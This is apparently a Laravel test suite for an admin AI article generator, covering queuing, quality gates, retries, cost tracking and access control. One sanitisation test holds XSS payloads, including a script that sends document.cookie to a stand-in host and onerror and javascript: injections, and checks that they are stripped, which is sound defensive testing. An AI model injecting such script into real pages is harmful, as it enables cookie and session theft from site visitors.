<?php

namespace Tests\Feature\Admin;

use App\Enums\AiGenerationStatus;
use App\Enums\PostStatus;
use App\Jobs\GenerateAiContentJob;
use App\Models\AiGeneration;
use App\Models\Category;
use App\Models\Post;
use App\Models\User;
use App\Services\AI\AiContentService;
use App\Services\AI\AiProviderManager;
use App\Services\AI\Exceptions\AiGenerationException;
use App\Services\AI\GenerationResult;
use App\Services\AI\Providers\FakeProvider;
use Database\Seeders\SettingSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;
use Tests\TestCase;

class AiGenerationTest extends TestCase
{
    use RefreshDatabase;

    private User $admin;

    private Category $category;

    private FakeProvider $provider;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(SettingSeeder::class);

        // Nothing in this suite may reach a real provider: the fake is bound
        // for every resolution, and any stray outbound HTTP call fails loudly
        // rather than silently costing money.
        Http::preventStrayRequests();

        config(['ai.providers.gemini.key' => 'test-key-not-real']);

        // Pinned rather than inherited from .env. These tests are about how the
        // quality gate behaves at a known threshold; tuning the live site's
        // numbers should not turn the suite red.
        config([
            'site.content.min_words' => 400,
            'site.content.min_quality_score' => 70,
            'site.content.auto_publish' => false,
        ]);

        $this->provider = new FakeProvider;
        app(AiProviderManager::class)->swap($this->provider);

        $this->admin = User::factory()->admin()->create();
        $this->category = Category::factory()->create();
    }

    /**
     * @return array<string, mixed>
     */
    private function payload(array $overrides = []): array
    {
        return array_merge([
            'topic' => 'What the new metro line changes for daily commuters',
            'content_type' => 'news',
            'tone' => 'informative',
            'category_id' => $this->category->id,
            'language' => 'en',
            'target_words' => 900,
        ], $overrides);
    }

    private function runJob(AiGeneration $generation, array $overrides = []): void
    {
        (new GenerateAiContentJob(
            generationId: $generation->id,
            requestData: $this->payload($overrides),
            userId: $this->admin->id,
            categoryId: $this->category->id,
            createPost: false,
        ))->handle(app(AiContentService::class));
    }

    public function test_the_generator_page_renders(): void
    {
        $this->actingAs($this->admin)
            ->get(route('admin.ai.index'))
            ->assertOk()
            ->assertSee('Generate an article');
    }

    public function test_the_page_never_leaks_an_api_key(): void
    {
        config(['ai.providers.gemini.key' => 'super-secret-key-value']);

        $this->actingAs($this->admin)
            ->get(route('admin.ai.index'))
            ->assertOk()
            ->assertDontSee('super-secret-key-value');
    }

    public function test_submitting_records_the_request_and_queues_a_job(): void
    {
        Queue::fake();

        $this->actingAs($this->admin)
            ->post(route('admin.ai.store'), $this->payload())
            ->assertSessionHasNoErrors();

        $generation = AiGeneration::first();

        // The row exists before any API call, so a crash mid-generation still
        // leaves a record of what was attempted.
        $this->assertNotNull($generation);
        $this->assertSame(AiGenerationStatus::Pending, $generation->status);
        $this->assertSame($this->admin->id, $generation->user_id);

        Queue::assertPushed(GenerateAiContentJob::class);
    }

    public function test_a_completed_generation_records_tokens_cost_and_quality(): void
    {
        $generation = AiGeneration::factory()->create();

        $this->runJob($generation);

        $generation->refresh();

        $this->assertSame(AiGenerationStatus::Completed, $generation->status);
        $this->assertSame(2050, $generation->totalTokens());
        $this->assertNotNull($generation->quality_score);
        $this->assertNotNull($generation->duration_ms);
        $this->assertNotEmpty($generation->parsed_output['content']);
    }

    public function test_hostile_html_from_the_model_is_stripped_before_it_is_stored(): void
    {
        $this->provider->willReturn([
            'title' => 'A perfectly ordinary headline about transport',
            'slug' => 'ordinary-headline',
            'excerpt' => 'Summary.',
            'content' => '<h2>Real section</h2><p>'.str_repeat('Genuine sentence here. ', 90).'</p>'
                .'<script>fetch("https://evil.test?c="+document.cookie)</script>'
                .'<img src=x onerror=alert(1)>'
                .'<a href="javascript:alert(2)">click</a>'
                .'<iframe src="//evil.test"></iframe>',
            'seo_title' => 'Ordinary headline',
            'seo_description' => 'A description.',
            'seo_keywords' => 'a, b',
            'tags' => ['Transport'],
            'image_prompt' => 'A train',
        ]);

        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $content = $generation->refresh()->parsed_output['content'];

        $this->assertStringNotContainsString('<script', $content);
        $this->assertStringNotContainsString('onerror', $content);
        $this->assertStringNotContainsString('javascript:', $content);
        $this->assertStringNotContainsString('<iframe', $content);
        $this->assertStringContainsString('Genuine sentence here', $content);
    }

    public function test_short_content_fails_the_quality_gate(): void
    {
        $this->provider->willReturn([
            'title' => 'A headline that is long enough',
            'slug' => 'short-one',
            'excerpt' => 'Summary.',
            'content' => '<h2>Section</h2><p>Far too short to publish.</p>',
            'seo_title' => 'Short',
            'seo_description' => 'Short.',
            'seo_keywords' => 'a',
            'tags' => [],
            'image_prompt' => 'x',
        ]);

        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $quality = $generation->refresh()->parsed_output['quality'];

        $this->assertFalse($quality['publishable']);
        $this->assertNotEmpty($quality['issues']);
    }

    public function test_a_truncated_article_is_flagged(): void
    {
        $this->provider->willReturn([
            'title' => 'A headline that is long enough to pass',
            'slug' => 'truncated',
            'excerpt' => 'Summary.',
            'content' => '<h2>Section</h2><p>'.str_repeat('A complete sentence here. ', 90).'and then it just stops mid',
            'seo_title' => 'Truncated',
            'seo_description' => 'Description.',
            'seo_keywords' => 'a',
            'tags' => [],
            'image_prompt' => 'x',
        ]);

        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $issues = implode(' ', $generation->refresh()->parsed_output['quality']['issues']);

        $this->assertStringContainsString('mid-sentence', $issues);
    }

    public function test_a_duplicate_title_is_caught(): void
    {
        Post::factory()->create(['title' => 'The exact same headline twice']);

        $this->provider->willReturn([
            'title' => 'The exact same headline twice',
            'slug' => 'dupe',
            'excerpt' => 'Summary.',
            'content' => '<h2>Section</h2><p>'.str_repeat('Enough words to pass the floor. ', 90).'</p>',
            'seo_title' => 'Dupe',
            'seo_description' => 'Description.',
            'seo_keywords' => 'a',
            'tags' => [],
            'image_prompt' => 'x',
        ]);

        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $quality = $generation->refresh()->parsed_output['quality'];

        $this->assertStringContainsString('already exists', implode(' ', $quality['issues']));
        $this->assertFalse($quality['publishable']);
    }

    public function test_a_permanent_failure_is_not_retried(): void
    {
        $this->provider->refuse('The model declined this topic.');

        $generation = AiGeneration::factory()->create();

        $job = new GenerateAiContentJob(
            generationId: $generation->id,
            requestData: $this->payload(),
            userId: $this->admin->id,
            createPost: false,
        );

        // A refused topic or a rejected key fails identically on every attempt,
        // so the job must give up rather than occupy a worker three times.
        $job->handle(app(AiContentService::class));

        $generation->refresh();

        $this->assertSame(AiGenerationStatus::Failed, $generation->status);
        $this->assertStringContainsString('declined', $generation->error_message);
        $this->assertSame(1, $this->provider->callCount());
    }

    public function test_a_retryable_failure_is_rethrown_so_the_queue_retries_it(): void
    {
        $this->provider->failRetryably('Rate limit reached');

        $generation = AiGeneration::factory()->create();

        $this->expectException(AiGenerationException::class);

        $this->runJob($generation);
    }

    public function test_a_generation_that_already_completed_is_never_run_twice(): void
    {
        $generation = AiGeneration::factory()->create(['status' => AiGenerationStatus::Completed]);

        $this->runJob($generation);

        // A retry after a successful attempt would bill twice and duplicate the post.
        $this->assertSame(0, $this->provider->callCount());
    }

    public function test_approving_creates_a_draft_flagged_as_ai_generated(): void
    {
        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $this->actingAs($this->admin)
            ->post(route('admin.ai.approve', $generation), ['category_id' => $this->category->id])
            ->assertRedirect();

        $post = Post::latest('id')->first();

        $this->assertNotNull($post);
        $this->assertTrue($post->ai_generated);
        $this->assertSame(PostStatus::Draft, $post->status);
        $this->assertSame($this->admin->id, $post->author_id);
        $this->assertSame($post->id, $generation->refresh()->post_id);
    }

    public function test_approving_with_publish_puts_it_live(): void
    {
        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $this->actingAs($this->admin)->post(route('admin.ai.approve', $generation), [
            'category_id' => $this->category->id,
            'publish' => 1,
        ]);

        $post = Post::latest('id')->first();

        $this->assertSame(PostStatus::Published, $post->status);
        $this->assertNotNull($post->published_at);
    }

    public function test_auto_publish_is_ignored_when_the_quality_gate_fails(): void
    {
        config(['site.content.auto_publish' => true]);

        $this->provider->willReturn([
            'title' => 'A headline long enough to pass',
            'slug' => 'weak',
            'excerpt' => 'Summary.',
            'content' => '<p>Far too short.</p>',
            'seo_title' => 'Weak',
            'seo_description' => 'Description.',
            'seo_keywords' => 'a',
            'tags' => [],
            'image_prompt' => 'x',
        ]);

        $generation = AiGeneration::factory()->create();

        (new GenerateAiContentJob(
            generationId: $generation->id,
            requestData: $this->payload(),
            userId: $this->admin->id,
            categoryId: $this->category->id,
            createPost: true,
        ))->handle(app(AiContentService::class));

        // The setting alone is never enough — weak content still lands as a
        // draft for a human to look at.
        $this->assertSame(PostStatus::Draft, Post::latest('id')->first()->status);
    }

    public function test_the_daily_limit_blocks_further_generations(): void
    {
        config(['ai.daily_limit' => 2]);

        AiGeneration::factory()->count(2)->create(['status' => AiGenerationStatus::Completed]);

        $generation = AiGeneration::factory()->create();

        $this->runJob($generation);

        $generation->refresh();

        // The cap is enforced before the provider is called, and the row says
        // why rather than sitting on "pending" forever.
        $this->assertSame(0, $this->provider->callCount());
        $this->assertSame(AiGenerationStatus::Failed, $generation->status);
        $this->assertStringContainsString('daily generation limit', $generation->error_message);
    }

    public function test_validation_rejects_a_thin_request(): void
    {
        $this->actingAs($this->admin)
            ->post(route('admin.ai.store'), ['topic' => 'x'])
            ->assertSessionHasErrors(['topic', 'content_type', 'tone', 'category_id']);
    }

    public function test_a_provider_without_a_key_cannot_be_selected(): void
    {
        $this->actingAs($this->admin)
            ->post(route('admin.ai.settings'), ['ai_provider' => 'openai'])
            ->assertSessionHasErrors('ai_provider');
    }

    public function test_the_provider_choice_is_saved(): void
    {
        config(['ai.providers.openai.key' => 'another-test-key']);

        $this->actingAs($this->admin)
            ->post(route('admin.ai.settings'), ['ai_provider' => 'openai', 'ai_model' => 'gpt-4o'])
            ->assertSessionHasNoErrors();

        $this->assertDatabaseHas('settings', ['key' => 'ai_provider', 'value' => 'openai']);
        $this->assertDatabaseHas('settings', ['key' => 'ai_model_openai', 'value' => 'gpt-4o']);
    }

    public function test_cost_is_calculated_for_model_ids_containing_dots(): void
    {
        // config() splits on dots, so a naive config("ai.pricing.$model") lookup
        // silently returns null for every real model id and every generation
        // records a cost of zero.
        $result = new GenerationResult(
            title: 't', slug: 's', excerpt: 'e', content: 'c',
            seoTitle: 't', seoDescription: 'd', seoKeywords: 'k',
            tags: [], imagePrompt: null,
            provider: 'gemini', model: 'gemini-2.5-flash',
            promptTokens: 1_000_000, completionTokens: 1_000_000, durationMs: 1,
        );

        $this->assertSame(2.80, $result->estimatedCost());
    }

    public function test_an_overlong_meta_description_is_trimmed_at_a_word_boundary(): void
    {
        $this->provider->willReturn([
            'title' => 'A headline long enough to pass the check',
            'slug' => 'long-meta',
            'excerpt' => 'Summary.',
            'content' => '<h2>Section</h2><p>'.str_repeat('Enough words to clear the floor. ', 90).'</p>',
            'seo_title' => 'Long meta',
            'seo_description' => str_repeat('This description is deliberately far too long. ', 8),
            'seo_keywords' => 'a',
            'tags' => [],
            'image_prompt' => 'x',
        ]);

        $generation = AiGeneration::factory()->create();
        $this->runJob($generation);

        $description = $generation->refresh()->parsed_output['seo_description'];

        $this->assertLessThanOrEqual(158, mb_strlen($description));
        $this->assertStringEndsNotWith(' ', $description);
        // Trimmed at a word boundary, so it never ends mid-word.
        $this->assertStringEndsWith('.', rtrim($description, '.').'.');
    }

    public function test_readers_cannot_reach_the_generator(): void
    {
        $reader = User::factory()->create();

        $this->actingAs($reader)->get(route('admin.ai.index'))->assertForbidden();
        $this->actingAs($reader)->post(route('admin.ai.store'), $this->payload())->assertForbidden();
    }
}
